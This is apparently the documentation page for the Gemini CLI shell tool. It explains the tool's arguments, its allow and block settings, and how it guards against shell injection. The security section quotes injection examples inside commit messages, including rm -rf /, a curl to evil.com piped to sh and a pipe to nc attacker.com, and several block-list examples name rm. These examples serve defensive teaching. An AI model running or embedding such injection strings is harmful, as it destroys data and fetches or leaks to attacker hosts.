# Shell Tool (`run_shell_command`)

This document describes the `run_shell_command` tool for the Gemini CLI.

## Description

Use `run_shell_command` to interact with the underlying system, run scripts, or perform command-line operations. `run_shell_command` executes a given shell command. On Windows, the command will be executed with `cmd.exe /c`. On other platforms, the command will be executed with `bash -c`.

### Arguments

`run_shell_command` takes the following arguments:

- `command` (string, required): The exact shell command to execute.
- `description` (string, optional): A brief description of the command's purpose, which will be shown to the user.
- `directory` (string, optional): The directory (relative to the project root) in which to execute the command. If not provided, the command runs in the project root.

## How to use `run_shell_command` with the Gemini CLI

When using `run_shell_command`, the command is executed as a subprocess. `run_shell_command` can start background processes using `&`. The tool returns detailed information about the execution, including:

- `Command`: The command that was executed.
- `Directory`: The directory where the command was run.
- `Stdout`: Output from the standard output stream.
- `Stderr`: Output from the standard error stream.
- `Error`: Any error message reported by the subprocess.
- `Exit Code`: The exit code of the command.
- `Signal`: The signal number if the command was terminated by a signal.
- `Background PIDs`: A list of PIDs for any background processes started.

Usage:

```
run_shell_command(command="Your commands.", description="Your description of the command.", directory="Your execution directory.")
```

## `run_shell_command` examples

List files in the current directory:

```
run_shell_command(command="ls -la")
```

Run a script in a specific directory:

```
run_shell_command(command="./my_script.sh", directory="scripts", description="Run my custom script")
```

Start a background server:

```
run_shell_command(command="npm run dev &", description="Start development server in background")
```

## Important notes

- **Security:** Be cautious when executing commands, especially those constructed from user input, to prevent security vulnerabilities. See the [Security Best Practices](#security-best-practices) section below.
- **Interactive commands:** Avoid commands that require interactive user input, as this can cause the tool to hang. Use non-interactive flags if available (e.g., `npm init -y`).
- **Error handling:** Check the `Stderr`, `Error`, and `Exit Code` fields to determine if a command executed successfully.
- **Background processes:** When a command is run in the background with `&`, the tool will return immediately and the process will continue to run in the background. The `Background PIDs` field will contain the process ID of the background process.

## Command Restrictions

You can restrict the commands that can be executed by the `run_shell_command` tool by using the `coreTools` and `excludeTools` settings in your configuration file.

- `coreTools`: To restrict `run_shell_command` to a specific set of commands, add entries to the `coreTools` list in the format `run_shell_command(<command>)`. For example, `"coreTools": ["run_shell_command(git)"]` will only allow `git` commands. Including the generic `run_shell_command` acts as a wildcard, allowing any command not explicitly blocked.
- `excludeTools`: To block specific commands, add entries to the `excludeTools` list in the format `run_shell_command(<command>)`. For example, `"excludeTools": ["run_shell_command(rm)"]` will block `rm` commands.

The validation logic is designed to be secure and flexible:

1.  **Command Chaining Disabled**: The tool automatically splits commands chained with `&&`, `||`, or `;` and validates each part separately. If any part of the chain is disallowed, the entire command is blocked.
2.  **Prefix Matching**: The tool uses prefix matching. For example, if you allow `git`, you can run `git status` or `git log`.
3.  **Blocklist Precedence**: The `excludeTools` list is always checked first. If a command matches a blocked prefix, it will be denied, even if it also matches an allowed prefix in `coreTools`.

### Command Restriction Examples

**Allow only specific command prefixes**

To allow only `git` and `npm` commands, and block all others:

```json
{
  "coreTools": ["run_shell_command(git)", "run_shell_command(npm)"]
}
```

- `git status`: Allowed
- `npm install`: Allowed
- `ls -l`: Blocked

**Block specific command prefixes**

To block `rm` and allow all other commands:

```json
{
  "coreTools": ["run_shell_command"],
  "excludeTools": ["run_shell_command(rm)"]
}
```

- `rm -rf /`: Blocked
- `git status`: Allowed
- `npm install`: Allowed

**Blocklist takes precedence**

If a command prefix is in both `coreTools` and `excludeTools`, it will be blocked.

```json
{
  "coreTools": ["run_shell_command(git)"],
  "excludeTools": ["run_shell_command(git push)"]
}
```

- `git push origin main`: Blocked
- `git status`: Allowed

**Block all shell commands**

To block all shell commands, add the `run_shell_command` wildcard to `excludeTools`:

```json
{
  "excludeTools": ["run_shell_command"]
}
```

- `ls -l`: Blocked
- `any other command`: Blocked

## Security Note for `excludeTools`

Command-specific restrictions in
`excludeTools` for `run_shell_command` are based on simple string matching and can be easily bypassed. This feature is **not a security mechanism** and should not be relied upon to safely execute untrusted code. It is recommended to use `coreTools` to explicitly select commands
that can be executed.

## Security Best Practices

### Shell Injection Prevention

Gemini CLI implements automatic shell escaping to prevent command injection vulnerabilities. When constructing commands with user input or special characters, the AI model is instructed to properly escape all arguments.

#### Common Attack Vectors

Special characters in shell commands can lead to command injection:

```bash
# DANGEROUS - Backticks execute commands
git commit -m "Fix `rm -rf /` bug"     # Would execute rm command!

# DANGEROUS - Dollar sign command substitution  
git commit -m "Update $(curl evil.com/script | sh)"

# DANGEROUS - Semicolon allows command chaining
git commit -m "Fix bug; rm -rf /"

# DANGEROUS - Pipe allows command piping
git commit -m "Fix bug | nc attacker.com 1337"
```

#### Safe Command Construction

Gemini CLI automatically escapes special characters using single quotes:

```bash
# SAFE - Single quotes prevent all expansions
git commit -m 'Fix `ComponentName` rendering issue'

# SAFE - Properly escaped single quote
git commit -m 'Fix Mary'\''s code'  

# SAFE - Special characters are literal
git commit -m 'Update $USER config @ $(date)'
```

#### Implementation Details

1. **Single Quote Protection**: Single quotes provide the strongest protection in bash/sh, preventing ALL expansions except the single quote itself
2. **Escape Pattern**: Single quotes within strings use the `'\''` pattern (end quote, escaped quote, start quote)
3. **Automatic Escaping**: The AI model is trained to automatically apply proper escaping to all shell arguments containing special characters

#### For Developers

When extending Gemini CLI with new shell command features:

1. Always use the `escapeShellArg()` utility from `@google/gemini-cli-core` for user input
2. Never use `eval` or similar dangerous constructs
3. Prefer Node.js APIs over shell commands when possible
4. Add security-focused tests for any new shell functionality

For more details, see the [Shell Injection Prevention Guide](/docs/security/shell-injection-prevention.md).
